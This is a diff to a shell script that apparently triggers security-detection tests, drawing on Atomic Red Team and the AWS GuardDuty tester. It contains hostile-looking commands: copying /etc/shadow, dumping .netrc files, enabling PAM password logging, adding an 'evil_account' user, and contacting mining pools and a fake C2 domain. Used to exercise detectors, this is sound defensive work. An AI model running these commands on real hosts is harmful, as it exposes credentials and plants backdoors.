@@ -31,7 +31,7 @@ echo "aws_secret_access_key = qLlZ_SecretKey" >> /root/.aws/credentials
 echo Executing Atomic Tests for Linux
 cat /etc/passwd > /tmp/passwd
 cat /etc/shadow > /tmp/shadow
-# Via https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md
+# Via https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md under MIT License
 whoami
 for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
 if  test -f /etc/pam.d/password-auth; then  cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if  test -f /etc/pam.d/system-auth; then  cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;  touch /tmp/password-auth.bk  touch /tmp/system-auth.bk  echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth  echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
@@ -43,6 +43,17 @@ timeout -s SIGKILL 5 tcpdump -c 5 -nnni en0
 cat /etc/login.defs
 useradd evil_account
 cat ~/.ssh/authorized_keys
+
+echo Running GuardDuty Triggers
+# Via https://github.com/awslabs/amazon-guardduty-tester under Apache 2.0 License
+echo "Calling bitcoin wallets to download mining toolkits"
+curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
+curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
+echo "Calling large numbers of large domains to simulate tunneling via DNS" 
+dig -f ./bins/queries.txt > /dev/null &
+echo
+echo "Calling a well known fake domain that is used to generate a known finding"
+dig GuardDutyC2ActivityB.com any
 
 echo Installing Docker
 if [ "$(grep -Ei 'debian|buntu|mint' /etc/*release)" ]; then
